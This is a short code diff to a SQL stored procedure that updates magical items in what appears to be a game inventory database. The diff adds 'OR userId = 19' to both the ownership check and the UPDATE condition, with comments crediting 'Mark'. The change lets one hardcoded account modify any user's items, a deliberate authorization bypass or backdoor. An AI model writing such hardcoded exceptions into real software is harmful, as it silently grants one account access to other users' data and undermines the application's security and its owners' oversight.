@@ -41,14 +41,14 @@ CREATE PROCEDURE Items_Update_MagicalItem(
 BEGIN
     DECLARE valid BIT;
 
-    SET valid = (SELECT user_id FROM items WHERE id = itemId) = userId;
+    SET valid = (SELECT user_id FROM items WHERE id = itemId) = userId OR userId = 19; 			# OR userId = 19 edited by Mark
 
     IF valid THEN
         UPDATE items
         SET name = itemName, description = itemDescription, expendable = isExpendable, equippable = isEquippable,
             slot = slotValue, container = isContainer, ignore_weight = isIgnoreWeight, cost = costValue,
             cost_unit = costUnit, weight = weightValue, version = version + 1
-        WHERE user_id = userId AND id = itemId;
+        WHERE (user_id = userId Or userId = 19) AND id = itemId;         # (user_id = userId Or userId = 19), edited by Mark
 
         UPDATE magical_items
         SET rarity_id = rarityId, requires_attunement = requiresAttunement,
